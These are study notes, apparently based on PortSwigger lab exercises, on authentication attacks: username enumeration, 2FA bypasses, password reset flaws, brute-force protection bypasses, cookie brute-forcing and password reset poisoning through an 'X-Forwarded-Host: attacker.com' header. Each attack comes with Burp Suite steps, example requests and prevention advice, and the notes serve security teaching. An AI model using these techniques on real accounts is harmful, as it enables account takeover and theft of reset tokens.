# Authentication – Introduction

## 1. What is Authentication?

Authentication is the process of verifying the identity of a user, application, or system.

It checks whether someone is really who they claim to be before allowing access to an account or protected resource.

## 2. Why is Authentication Important?

- Protects user accounts from unauthorized access.
- Prevents attackers from accessing private information.
- Helps secure sensitive application features.
- Ensures that only verified users can access their accounts.

## 3. Common Authentication Methods

- **Username and Password:** Users log in using their registered credentials.
- **Multi-Factor Authentication (MFA):** Requires two or more verification methods.
- **One-Time Password (OTP):** Uses a temporary code for identity verification.
- **Biometric Authentication:** Uses fingerprints or facial recognition.
- **Token-Based Authentication:** Uses tokens to verify authenticated users.

## 4. Authentication vs Authorization

| Authentication | Authorization |
|---|---|
| Verifies user identity. | Checks user permissions. |
| Answers: Who are you? | Answers: What can you access? |
| Happens before access is granted. | Determines what actions are allowed. |

## 5. Key Takeaways

- Authentication verifies the identity of a user.
- It is an important part of web application security.
- Weak authentication can allow attackers to access user accounts.
- Strong passwords and MFA improve account security.
- Authentication and authorization are different security concepts.
# Authentication – Username Enumeration via Different Responses

## 1. Why Does It Happen?

- Some applications return different error messages for valid and invalid usernames.
- For example, an invalid username may show `Invalid username`, while a valid username with an incorrect password may show `Incorrect password`.
- Attackers can compare these responses to identify valid usernames.
- Once a valid username is discovered, attackers may attempt password brute-force attacks.
- This vulnerability is called **Username Enumeration**.

## 2. Payload Used

Unlike SQL Injection, this attack does not require a special SQL payload. It uses different username and password combinations in login requests.

**Step 1: Test an invalid username**

```http
POST /login
username=invalid-user&password=test123
```

Possible response:

```text
Invalid username
```

**Step 2: Test a valid username with an incorrect password**

```http
POST /login
username=administrator&password=wrong-password
```

Possible response:

```text
Incorrect password
```

**Step 3: Test multiple usernames**

Use a list of candidate usernames with Burp Suite Intruder to compare responses.

**Step 4: Test passwords for the identified username**

Use a candidate password list to identify a password that successfully authenticates.

## 3. Payload Explanation

- `POST /login` – Sends login credentials to the application.
- `username` – Represents the username being tested.
- `password` – Represents the password being tested.
- `invalid-user` – An example of a username that does not exist.
- `administrator` – An example of a possible valid username.
- `Burp Suite Intruder` – Automates testing with multiple username and password values.
- `Invalid username` – Indicates that the username may not exist.
- `Incorrect password` – Indicates that the username may exist, but the password is incorrect.

## 4. How Does It Work?

1. Open the application's login page.
2. Submit an incorrect username and password.
3. Intercept the login request using Burp Suite.
4. Send the request to Burp Suite Intruder.
5. Select the `username` parameter as the payload position.
6. Load a list of candidate usernames.
7. Compare response lengths and error messages.
8. Identify the username that returns `Incorrect password` instead of `Invalid username`.
9. Replace the username payload with the identified username.
10. Select the `password` parameter as the payload position.
11. Load a list of candidate passwords.
12. Compare HTTP status codes and responses.
13. A successful login may return HTTP `302` (redirect), while failed attempts may return HTTP `200`.
14. Use the valid credentials to access the account.

## 5. Prevention

- Use the same generic error message for invalid usernames and incorrect passwords.
- Avoid revealing whether an account exists.
- Implement rate limiting on login attempts.
- Use account lockout or temporary login restrictions carefully.
- Implement multi-factor authentication (MFA).
- Monitor repeated login attempts.
- Use strong password policies.

## 6. Key Takeaways

- Username enumeration is the process of discovering valid usernames.
- Different login error messages can reveal whether a username exists.
- `Invalid username` and `Incorrect password` responses can expose account information.
- Burp Suite Intruder can automate username and password testing.
- HTTP response length and status codes can help identify successful login attempts.
- Attackers can combine username enumeration with password brute-force attacks.
- Generic login error messages help prevent username enumeration.
# Authentication – Two-Factor Authentication (2FA) Simple Bypass

## 1. Why Does It Happen?

- Two-Factor Authentication (2FA) adds an extra security layer after username and password verification.
- Some applications verify the 2FA code only on the login page.
- However, they fail to check whether 2FA verification has been completed before allowing access to protected pages.
- Attackers who already have valid credentials may directly access protected pages without completing the 2FA process.
- This vulnerability is called **2FA Simple Bypass**.

## 2. Payload Used

This vulnerability does not require a special SQL or injection payload. It involves directly accessing a protected URL before completing 2FA verification.

**Step 1: Login with valid credentials**

```text
Username: valid-user
Password: valid-password
```

**Step 2: Observe the 2FA verification page**

After entering valid credentials, the application asks for a verification code.

**Step 3: Access the protected account page directly**

```http
GET /my-account
```

**Step 4: Check the response**

If the application opens the account page without verifying the 2FA code, the authentication mechanism is vulnerable.

## 3. Payload Explanation

- `GET` – HTTP method used to request a resource.
- `/my-account` – Example of a protected account page.
- Direct URL access – Attempts to open a protected page without completing the 2FA verification step.
- 2FA verification – Additional identity verification required after the password login.
- Session – Maintains the user's authentication state between requests.

## 4. How Does It Work?

1. First, log in using valid username and password credentials.
2. The application redirects the user to the 2FA verification page.
3. Normally, the user must enter a valid verification code.
4. Instead of completing 2FA, directly navigate to the protected account URL.
5. If the application loads the account page, it means the server has not properly enforced 2FA verification.
6. The attacker can access protected account information without completing the second authentication step.

**Example:**

| Authentication step | Expected behavior |
|---|---|
| Enter valid username and password | Login accepted |
| 2FA verification required | Verification page displayed |
| Access protected page without 2FA | Access should be denied |
| Vulnerable application | Protected page opens |

## 5. Prevention

- Enforce 2FA verification on the server side.
- Do not grant full authentication after password verification alone.
- Maintain a separate session state for pending 2FA verification.
- Check the user's 2FA completion status on every protected request.
- Do not rely only on frontend redirects or hidden form fields.
- Restrict access to protected pages until all authentication steps are completed.
- Invalidate incomplete authentication sessions appropriately.

## 6. Key Takeaways

- 2FA adds an additional security layer to login authentication.
- Valid username and password credentials should not provide full access before 2FA verification.
- Direct URL access can expose missing server-side authentication checks.
- Hiding the 2FA page does not make an application secure.
- Every protected request must verify that 2FA has been completed.
- Improper 2FA implementation can lead to account takeover.
# Authentication – Password Reset Broken Logic

## 1. Why Does It Happen?

- Password reset functionality allows users to recover access to their accounts.
- Applications often use temporary reset tokens to verify password reset requests.
- If the application does not properly validate these tokens, attackers may be able to reset another user's password.
- Some applications also trust hidden username parameters submitted by the browser.
- Attackers can manipulate these parameters to target another account.
- This vulnerability is called **Password Reset Broken Logic**.

## 2. Payload Used

The following example shows the structure of a password reset request.

**Step 1: Normal password reset request**

```http
POST /forgot-password?temp-forgot-password-token=RESET_TOKEN
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=RESET_TOKEN&username=wiener&new-password=newpassword123
```

**Step 2: Remove the reset token**

```http
POST /forgot-password?temp-forgot-password-token=
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=wiener&new-password=newpassword123
```

If the application still accepts the password change, it indicates that the reset token is not being properly validated.

**Step 3: Change the username parameter**

```http
POST /forgot-password?temp-forgot-password-token=
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password=newpassword123
```

The vulnerability occurs when the application accepts this request and changes the password for the specified account without validating the reset token.

## 3. Payload Explanation

- `POST` – Sends the password reset request to the server.
- `/forgot-password` – Password reset endpoint.
- `temp-forgot-password-token` – Temporary token intended to verify the password reset request.
- `RESET_TOKEN` – Represents the valid reset token generated for the user.
- `username` – Identifies the account whose password is being changed.
- `wiener` – Example of the original account username.
- `carlos` – Example of another account username.
- `new-password` – Contains the new password submitted by the user.
- Empty token value – Tests whether the application incorrectly allows password changes without a valid reset token.

## 4. How Does It Work?

1. Request a password reset for your own account.
2. Open the password reset email and follow the reset link.
3. Change your password and capture the request using Burp Suite.
4. Send the password reset request to Burp Repeater.
5. Remove the reset token from both the URL and request body.
6. Check whether the password reset request still works.
7. If it works, the application may not be validating the reset token.
8. Change the `username` parameter to another account in an authorized test environment.
9. Submit the modified request.
10. If the application changes the target account's password, the password reset functionality has a broken authorization or token-validation mechanism.

## 5. Prevention

- Generate cryptographically secure random reset tokens.
- Validate reset tokens on every password reset request.
- Bind each reset token to a specific user account.
- Never trust hidden username fields submitted by the browser.
- Ensure reset tokens expire after a short period.
- Make reset tokens single-use.
- Invalidate reset tokens after a successful password change.
- Use server-side validation for all password reset operations.
- Notify users when their passwords are changed.

## 6. Key Takeaways

- Password reset functionality must securely verify user identity.
- Reset tokens should be mandatory for password changes through the recovery process.
- Removing a reset token should never allow a password change.
- Hidden form parameters can be modified by users.
- The server must not blindly trust the submitted username.
- Reset tokens should be random, temporary, account-specific, and single-use.
- Broken password reset logic can lead to account takeover.
# Authentication – Username Enumeration via Subtly Different Responses

## 1. Why Does It Happen?

- Some applications return slightly different responses for valid and invalid usernames.
- The difference may be very small, such as an extra space, punctuation mark, response length, or status code.
- Attackers can compare these responses to identify valid usernames.
- Once a valid username is discovered, attackers can attempt password brute-force attacks.
- This vulnerability is called **Username Enumeration via Subtly Different Responses**.

## 2. Payload Used

This attack does not require a special injection payload. It uses multiple login requests and compares their responses.

**Step 1: Test candidate usernames**

```http
POST /login

username=invalid-user&password=wrong-password
```

**Step 2: Compare the error messages**

Example responses:

```text
Invalid username or password.
```

```text
Invalid username or password. 
```

Notice that the second response contains an extra trailing space.

**Step 3: Test the identified username with different passwords**

```http
POST /login

username=identified-user&password=invalid-password
```

Use a candidate password list to test possible passwords.

## 3. Payload Explanation

- `POST /login` – Sends login credentials to the application.
- `username` – Contains the username being tested.
- `password` – Contains the password being tested.
- `Candidate usernames` – A list of possible usernames.
- `Candidate passwords` – A list of possible passwords.
- `Trailing space` – An extra space at the end of an error message.
- `Burp Suite Intruder` – Automates testing with multiple username and password values.
- `Grep - Extract` – Extracts specific response content to compare responses easily.
- `HTTP 302` – Redirect status that may indicate successful login.

## 4. How Does It Work?

1. First, submit an incorrect username and password.
2. Capture the login request using Burp Suite.
3. Send the request to Burp Suite Intruder.
4. Select the `username` parameter as the payload position.
5. Load a list of candidate usernames.
6. Use the **Grep - Extract** feature to extract the login error message.
7. Start the attack and compare the extracted responses.
8. Look for a subtly different response, such as an extra trailing space.
9. Identify the username associated with that response.
10. Replace the username payload with the identified username.
11. Select the `password` parameter as the payload position.
12. Load a list of candidate passwords and start the attack.
13. Compare the responses and look for a successful login indicator, such as HTTP `302`.
14. Use the identified credentials to access the account.

## 5. Prevention

- Return exactly the same error message for all failed login attempts.
- Avoid differences in response content, formatting, and length.
- Use consistent HTTP status codes for failed authentication.
- Implement rate limiting on login attempts.
- Monitor repeated login attempts.
- Use multi-factor authentication (MFA).
- Avoid revealing whether a username exists.

## 6. Key Takeaways

- Username enumeration can happen through very small response differences.
- An extra space or punctuation difference can reveal a valid username.
- HTTP response status, length, and content can help identify differences.
- Burp Suite Intruder automates username and password testing.
- Grep - Extract helps compare specific response content.
- HTTP `302` may indicate successful authentication.
- Generic and consistent error responses help prevent username enumeration.
# Authentication – Username Enumeration via Response Timing

## 1. Why Does It Happen?

- Some applications take different amounts of time to respond depending on whether a username exists.
- When an invalid username is submitted, the application may respond quickly.
- When a valid username is submitted, the application may take longer because it performs additional password verification.
- Attackers can compare response times to identify valid usernames.
- This vulnerability is called **Username Enumeration via Response Timing**.

## 2. Payload Used

This attack does not require a special injection payload. It uses login requests with different usernames and measures their response times.

**Step 1: Test an invalid username**

```http
POST /login

username=invalid-user&password=wrong-password
```

**Step 2: Test a possible valid username**

```http
POST /login

username=wiener&password=wrong-password
```

**Step 3: Use a long password to increase the timing difference**

```http
POST /login

username=wiener&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Step 4: Compare response times**

| Username | Expected response |
|---|---|
| Invalid username | Relatively quick response |
| Valid username | Longer response time |

## 3. Payload Explanation

- `POST /login` – Sends login credentials to the application.
- `username` – Contains the username being tested.
- `password` – Contains the password being submitted.
- Long password – Helps make differences in password-processing time easier to observe.
- `X-Forwarded-For` – HTTP header that some applications use to identify the original client IP address.
- `Burp Suite Repeater` – Helps manually test requests and compare response times.
- `Burp Suite Intruder` – Automates testing with multiple usernames and passwords.
- `Pitchfork Attack` – Allows multiple payload lists to be used together, position by position.
- `Response time` – The time taken by the application to respond to a request.
- `HTTP 302` – Redirect status that may indicate successful login.

## 4. How Does It Work?

1. First, submit an invalid username and password.
2. Capture the login request using Burp Suite.
3. Send the request to Burp Repeater.
4. Test different usernames and observe their response times.
5. Use a long password to make timing differences more noticeable.
6. Compare the response times for invalid and valid usernames.
7. A valid username may produce a significantly longer response because the application performs additional password processing.
8. Use Burp Intruder with a Pitchfork attack to test multiple usernames.
9. Add the `X-Forwarded-For` header if the application supports it and its IP-based rate limiting can be safely tested in an authorized environment.
10. Identify the username that consistently produces a longer response.
11. Use that username to test candidate passwords.
12. Compare the responses and look for a successful login indicator, such as HTTP `302`.
13. Confirm the credentials by logging in.

## 5. Prevention

- Ensure authentication responses take approximately the same amount of time for valid and invalid usernames.
- Use consistent password verification processes.
- Apply rate limiting to login attempts.
- Do not blindly trust the `X-Forwarded-For` header.
- Configure trusted proxy headers correctly.
- Monitor repeated login attempts.
- Implement multi-factor authentication (MFA).
- Use generic login error messages.

## 6. Key Takeaways

- Username enumeration can happen through response-time differences.
- Valid usernames may take longer to process than invalid usernames.
- Long passwords can make timing differences easier to identify.
- Burp Repeater helps compare response times manually.
- Burp Intruder automates username and password testing.
- Pitchfork attack allows multiple payload lists to be tested together.
- `X-Forwarded-For` can be abused when applications trust unvalidated client-supplied headers.
- Authentication responses should avoid revealing whether a username exists.
# Authentication – Broken Brute-Force Protection (IP Block)

## 1. Why Does It Happen?

- Applications use IP blocking to prevent attackers from making repeated login attempts.
- After a certain number of incorrect login attempts, the application temporarily blocks the user's IP address.
- However, some applications have a logic flaw that allows attackers to reset the failed login counter.
- For example, successfully logging into another account may reset the counter.
- Attackers can exploit this behavior to continue brute-forcing a victim's password without getting permanently blocked.
- This vulnerability is called **Broken Brute-Force Protection**.

## 2. Payload Used

This attack does not require a special injection payload. It exploits incorrect login-attempt tracking.

**Step 1: Submit incorrect login credentials**

```http
POST /login

username=carlos&password=wrong-password
```

**Step 2: Login to your own account**

```http
POST /login

username=wiener&password=peter
```

A successful login resets the failed login counter.

**Step 3: Alternate between accounts**

```text
1. wiener : peter
2. carlos : password1
3. wiener : peter
4. carlos : password2
5. wiener : peter
6. carlos : password3
```

Repeat this pattern while testing candidate passwords.

## 3. Payload Explanation

- `wiener` – Your own test account username.
- `peter` – Password for the test account.
- `carlos` – Target account username in the authorized lab.
- `password1`, `password2` – Example candidate passwords.
- `POST /login` – Sends login credentials to the application.
- **IP Blocking** – Temporarily blocks login attempts from an IP address after repeated failures.
- **Failed Login Counter** – Tracks the number of consecutive unsuccessful login attempts.
- **Burp Suite Intruder** – Automates login requests using multiple payloads.
- **Pitchfork Attack** – Allows two payload lists to be used together, position by position.
- **HTTP 200** – Usually indicates a normal response, which may include a failed login message.
- **HTTP 302** – Redirect response that may indicate successful login.

## 4. How Does It Work?

1. First, investigate the login page and identify its IP-blocking behavior.
2. Submit three incorrect login attempts and observe that the IP address is temporarily blocked.
3. Discover that successfully logging into your own account resets the failed login counter.
4. Capture the login request using Burp Suite.
5. Send the request to Burp Suite Intruder.
6. Select the `username` and `password` parameters as payload positions.
7. Choose a Pitchfork attack.
8. Create a username list that alternates between your own account and the target account.
9. Add your own valid password before each candidate password in the password list.
10. Make sure both payload lists are aligned correctly.
11. Configure the resource pool to allow only one concurrent request so requests are processed in order.
12. Start the attack and compare the responses.
13. Filter out HTTP `200` responses and look for an unusual HTTP `302` response for the target username.
14. The corresponding password may be the correct password.
15. Verify the credentials in the authorized test environment.

## 5. Prevention

- Implement reliable brute-force protection on the server side.
- Track failed login attempts independently for each account.
- Do not reset failed-attempt counters simply because another account logs in successfully.
- Apply rate limiting based on both account and IP address.
- Use progressive delays after repeated failed attempts.
- Implement multi-factor authentication (MFA).
- Monitor unusual login patterns.
- Use secure account-lockout policies.

## 6. Key Takeaways

- IP blocking helps prevent repeated password guessing.
- Incorrect implementation can allow attackers to bypass brute-force protection.
- A successful login to another account may reset the failed login counter in vulnerable applications.
- Alternating between accounts can exploit this logic flaw.
- Burp Suite Intruder automates the testing process.
- Pitchfork attacks allow multiple payload lists to be aligned.
- HTTP response codes can help identify successful login attempts.
- Brute-force protection should be enforced consistently on the server side.
# Authentication – Username Enumeration via Account Lock

## 1. Why Does It Happen?

- Applications use account locking to protect users from brute-force password attacks.
- After several incorrect login attempts, the application temporarily locks the account.
- However, a weakness in the login logic can reveal whether a username exists.
- For example, valid usernames may trigger an account-lock message, while invalid usernames show a normal login error.
- Attackers can use this difference to identify valid usernames.
- This vulnerability is called **Username Enumeration via Account Lock**.

## 2. Payload Used

No special injection payload is required. The attack uses repeated login requests with different usernames and passwords.

Example login request:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
```

To test usernames, submit each candidate username multiple times.

To test passwords, use the identified username with different candidate passwords.

## 3. Payload Explanation

- **Candidate Usernames** – A list of possible usernames.
- **Candidate Passwords** – A list of possible passwords.
- **Account Locking** – Temporarily prevents login after repeated failed attempts.
- **Cluster Bomb** – A Burp Intruder attack type that tests combinations of multiple payload positions.
- **Null Payloads** – Generates empty payloads. They can repeat a username a set number of times.
- **Sniper** – Tests one payload position while keeping the other request values fixed.
- **Grep Extract** – Extracts specific response text to make response differences easier to identify.
- **Different Error Messages** – Can reveal whether an account exists or has been locked.

## 4. How Does It Work?

1. Capture the login request using Burp Suite.
2. Send the request to Burp Intruder.
3. Use a Cluster Bomb attack to test candidate usernames.
4. Repeat each username several times to trigger the account-lock behavior.
5. Compare the server responses.
6. Look for a different error message, such as:

   ```text
   You have made too many incorrect login attempts.
   ```

7. This different response may reveal a valid username.
8. Use the identified username to test candidate passwords.
9. Use Burp Intruder with a Sniper attack to test the password list.
10. Configure Grep Extract to identify the login error message.
11. A response without the usual error message may indicate a successful login.
12. Verify the result in an authorized testing environment.

## 5. Prevention

- Use the same login error message for valid and invalid usernames.
- Avoid revealing account-lock status to unauthenticated users.
- Apply rate limiting consistently.
- Use progressive delays for repeated failed attempts.
- Monitor unusual login activity.
- Use multi-factor authentication (MFA).
- Design account-locking logic carefully to avoid creating a username-enumeration weakness.

## 6. Key Takeaways

- Account locking protects against repeated login attempts.
- Different responses can reveal valid usernames.
- Repeating login attempts can expose account-lock behavior.
- Burp Intruder helps automate username and password testing.
- Cluster Bomb and Sniper are useful for different testing tasks.
- Grep Extract helps identify differences in server responses.
- Login errors should not reveal whether an account exists.
# Authentication – 2FA Broken Logic

## 1. Why Does It Happen?

- Two-Factor Authentication (2FA) adds an extra security step after username and password verification.
- The application sends or generates a temporary verification code for the user.
- However, incorrect server-side logic may allow users to change which account is being verified.
- For example, the application may trust a username supplied in a request without checking whether it belongs to the authenticated user.
- An attacker can manipulate this value to generate or verify a 2FA code for another account.
- This vulnerability is called **2FA Broken Logic**.

## 2. Payload Used

No special injection payload is required. The attack involves changing request parameters.

Example:

```http
GET /login2?verify=carlos HTTP/1.1
```

Example 2FA verification request:

```http
POST /login2 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

verify=carlos&mfa-code=123456
```

## 3. Payload Explanation

- **GET /login2** – Requests the 2FA verification process.
- **POST /login2** – Submits the 2FA verification code.
- **verify** – Identifies the account being verified.
- **carlos** – Example target username.
- **mfa-code** – Parameter containing the 2FA verification code.
- **123456** – Example six-digit verification code.
- **Burp Suite Repeater** – Helps modify and resend HTTP requests.
- **Burp Suite Intruder** – Automates testing of different verification codes.
- **HTTP 302** – Redirect response that may indicate successful verification.

## 4. How Does It Work?

1. Log in using valid username and password credentials in an authorized test environment.
2. Observe the 2FA verification process using Burp Suite.
3. Inspect the request parameters used during verification.
4. Identify whether the application uses a parameter such as `verify` to determine the account.
5. Check whether this parameter is properly linked to the authenticated user.
6. If the application trusts the supplied username, changing it may allow verification to be performed for another account.
7. Submit the modified request and observe the response.
8. If the application also allows repeated code attempts without proper protection, an attacker may be able to brute-force the 2FA code.
9. A successful verification may create an authenticated session for the wrong account.

## 5. Prevention

- Bind every 2FA challenge to the authenticated user's server-side session.
- Never trust a username supplied by the client to identify the account being verified.
- Verify that the 2FA code belongs to the same user who completed the password step.
- Make verification codes short-lived.
- Allow each code to be used only once.
- Apply rate limiting to failed 2FA attempts.
- Invalidate old verification challenges when a new one is generated.
- Use secure session management throughout the authentication process.

## 6. Key Takeaways

- 2FA adds an extra layer of authentication.
- Broken logic can allow attackers to manipulate the account being verified.
- Client-supplied account identifiers must not be trusted.
- Burp Suite helps inspect and modify authentication requests.
- Weak verification limits can make 2FA codes vulnerable to brute-force attacks.
- Always bind the 2FA challenge to the correct authenticated user.
# Authentication – Brute-Forcing a Stay-Logged-In Cookie

## 1. Why Does It Happen?

- Many websites provide a **Stay logged in** or **Remember me** option.
- This option allows users to remain logged in even after closing their browser.
- The application stores a persistent authentication cookie in the browser.
- If the cookie is created using predictable information, attackers may be able to guess or brute-force it.
- For example, an application may create the cookie using the username and an MD5 hash of the user's password.
- If the password is weak, attackers can generate possible cookies and test them.
- This vulnerability is called **Brute-Forcing a Stay-Logged-In Cookie**.

## 2. Payload Used

Example cookie format:

```text
base64(username:MD5(password))
```

Example:

```text
username = wiener
password = peter
```

First, calculate the MD5 hash of the password:

```text
MD5("peter") = 51dc30ddc473d43a6011e9ebba6ca770
```

Combine the username and hash:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Encode the combined value using Base64:

```text
Base64("wiener:51dc30ddc473d43a6011e9ebba6ca770")
```

This produces the stay-logged-in cookie value.

## 3. Payload Explanation

- **Stay-Logged-In Cookie** – A persistent cookie used to keep users authenticated.
- **Base64** – An encoding method that converts data into a text representation. It is not encryption.
- **MD5** – A weak hashing algorithm that produces a 128-bit hash.
- **Username** – Identifies the account associated with the cookie.
- **Password Hash** – Represents the password in hashed form.
- **Burp Suite Intruder** – Automates testing of generated cookie values.
- **Payload Processing** – Applies transformations to candidate passwords before sending requests.
- **Hash: MD5** – Converts each candidate password into an MD5 hash.
- **Add Prefix** – Adds the username followed by a colon.
- **Base64 Encode** – Encodes the complete username and hash combination.
- **Grep Match** – Identifies responses containing a specific string, such as `Update email`.

## 4. How Does It Work?

1. Log in to an account with the Stay logged in option enabled.
2. Capture the request using Burp Suite.
3. Find the `stay-logged-in` cookie.
4. Decode its Base64 value.
5. Observe the username and hash inside the decoded value.
6. Identify the possible hashing algorithm by examining the hash format.
7. Confirm whether the hash is generated from the password.
8. Send a request containing the cookie to Burp Intruder.
9. Add the candidate passwords as payloads.
10. Configure payload processing in this order:
    - Hash using MD5.
    - Add the username and colon as a prefix.
    - Encode the result using Base64.
11. Send the generated cookie values in requests.
12. Compare responses to identify a valid authenticated session.
13. In the PortSwigger example, the presence of `Update email` indicates that the account page was accessed in an authenticated state.

## 5. Prevention

- Never use weak or fast hashing algorithms such as MD5 for password-related authentication.
- Use strong password hashing algorithms such as Argon2id, bcrypt, or scrypt.
- Generate cryptographically random, unpredictable remember-me tokens.
- Store only a secure representation of persistent tokens on the server.
- Do not construct authentication cookies directly from usernames and password hashes.
- Set appropriate expiration times for persistent cookies.
- Use `Secure`, `HttpOnly`, and appropriate `SameSite` cookie attributes.
- Support token revocation and rotation.
- Re-authenticate users for sensitive account actions.

## 6. Key Takeaways

- Stay-logged-in cookies provide persistent authentication.
- Weak cookie construction can make authentication tokens predictable.
- Base64 is encoding, not encryption.
- MD5 is not suitable for secure password hashing.
- Burp Intruder can automate cookie brute-forcing.
- Payload processing can hash, add prefixes, and encode candidate values.
- Response differences can help identify a valid authentication cookie.
- Secure remember-me functionality should use random tokens that cannot be calculated from usernames and passwords.
# Authentication – Password Reset Poisoning via Middleware

## 1. Why Does It Happen?

- Password reset functionality allows users to reset forgotten passwords through email links.
- The application generates a password reset URL using information from the incoming HTTP request.
- Sometimes, middleware or reverse proxies forward attacker-controlled HTTP headers to the application.
- If the application trusts the `X-Forwarded-Host` header, an attacker may change the domain used to generate the password reset link.
- The application then sends an email containing a reset link pointing to the attacker's domain instead of the legitimate website.
- If the victim clicks the link, the reset token may be sent to the attacker's server.
- This vulnerability is called **Password Reset Poisoning**.

## 2. Payload Used

The main header used in this attack is:

```http
X-Forwarded-Host: attacker.com
```

Example password reset request:

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

Example generated reset link:

```text
https://attacker.com/forgot-password?temp-forgot-password-token=abc123
```

## 3. Payload Explanation

- **X-Forwarded-Host** – An HTTP header commonly used by proxies to communicate the original host information.
- **Host** – Specifies the hostname of the requested server.
- **attacker.com** – Example attacker-controlled domain.
- **username** – Identifies the account requesting a password reset.
- **temp-forgot-password-token** – Temporary token used to authorize a password reset.
- **Middleware** – Software that processes requests between the client and application.
- **Reverse Proxy** – A server that forwards client requests to backend servers.
- **Burp Suite Repeater** – Allows testers to modify and resend HTTP requests.
- **Access Logs** – Record requests received by a server. They may expose leaked reset tokens.

## 4. How Does It Work?

1. Identify the password reset functionality.
2. Submit a password reset request and observe the email containing the reset link.
3. Capture the `POST /forgot-password` request using Burp Suite.
4. Send the request to Burp Repeater.
5. Check whether the application supports the `X-Forwarded-Host` header.
6. Change the header to a domain controlled by the tester.

   ```http
   X-Forwarded-Host: attacker.com
   ```

7. Submit the password reset request for the target account in an authorized test environment.
8. The application may generate a reset link using the attacker-controlled domain.
9. When the victim clicks the link, the browser sends the reset token to the attacker's server.
10. The attacker checks the server access logs to find the leaked token.
11. If the token is valid and has not expired, it may be used with the legitimate password reset endpoint.
12. The attacker can then reset the victim's password.

## 5. Prevention

- Never trust `X-Forwarded-Host` directly from untrusted clients.
- Configure reverse proxies to remove or overwrite untrusted forwarded headers.
- Use a fixed, trusted domain when generating password reset links.
- Validate hostnames against an allowlist.
- Generate cryptographically secure, random reset tokens.
- Bind reset tokens to the correct user account.
- Set short expiration times for reset tokens.
- Make reset tokens single-use.
- Use HTTPS for password reset links.
- Monitor suspicious password reset requests and unexpected host headers.

## 6. Key Takeaways

- Password reset poisoning exploits weak password reset URL generation.
- Middleware and reverse proxies can pass attacker-controlled headers to applications.
- `X-Forwarded-Host` may influence the domain used in reset links.
- A victim clicking a poisoned link can leak their reset token.
- Burp Suite helps modify and test HTTP headers.
- Access logs can reveal requests containing leaked tokens.
- Password reset links should always use a trusted, fixed domain.

# Authentication – Password Brute-Force via Password Change

## 1. Why Does It Happen?

- Websites provide password change functionality so users can update their passwords.
- Before changing a password, the application usually asks for the current password.
- However, weak validation logic may reveal whether the submitted current password is correct.
- For example, the application may return different error messages depending on whether the current password is valid.
- An attacker can use these response differences to identify the correct password.
- This vulnerability is called **Password Brute-Force via Password Change**.

## 2. Payload Used

Example password change request:

```http
POST /my-account/change-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=wrongpassword&new-password-1=123&new-password-2=abc
```

The important part is that the two new passwords are different.

Example response when the current password is incorrect:

```text
Current password is incorrect
```

Example response when the current password is correct:

```text
New passwords do not match
```

## 3. Payload Explanation

- **username** – Identifies the account whose password is being changed.
- **current-password** – Contains the existing password.
- **new-password-1** – First entry for the new password.
- **new-password-2** – Confirmation of the new password.
- **Burp Suite Intruder** – Automates testing of candidate current passwords.
- **Grep Match** – Identifies responses containing a specific message.
- **Candidate Passwords** – A list of possible passwords to test.
- **Different Error Messages** – Reveal whether the current password is valid.

## 4. How Does It Work?

1. Log in to an authorized test account.
2. Open the password change functionality.
3. Capture the password change request using Burp Suite.
4. Observe how the application responds to incorrect current passwords.
5. Notice that different new password values can produce different error messages.
6. Send the request to Burp Intruder.
7. Change the username parameter to the account being tested.
8. Add a payload position to the `current-password` parameter.
9. Keep the two new password values different.

   ```text
   username=carlos
   current-password=§candidate-password§
   new-password-1=123
   new-password-2=abc
   ```

10. Load the candidate password list into Intruder.
11. Configure Grep Match to identify the response:

    ```text
    New passwords do not match
    ```

12. Start the attack and compare the responses.
13. A response containing `New passwords do not match` indicates that the submitted current password may be correct.
14. Verify the result through an authorized login.

## 5. Prevention

- Use consistent error messages that do not reveal whether the current password is correct.
- Apply rate limiting to password change requests.
- Monitor repeated password verification attempts.
- Require proper authentication before allowing password changes.
- Use MFA or re-authentication for sensitive account changes.
- Do not trust hidden username fields supplied by the client.
- Bind password change requests to the authenticated user's server-side session.
- Prevent automated password guessing through layered security controls.

## 6. Key Takeaways

- Password change functionality can become a target for brute-force attacks.
- Different error messages can reveal valid passwords.
- Keeping the two new password fields different can expose the current-password validation result.
- Burp Intruder automates password testing.
- Grep Match helps identify the response that indicates a valid password.
- Error messages should not expose sensitive authentication information.
- Password change functionality needs proper server-side validation and rate limiting.
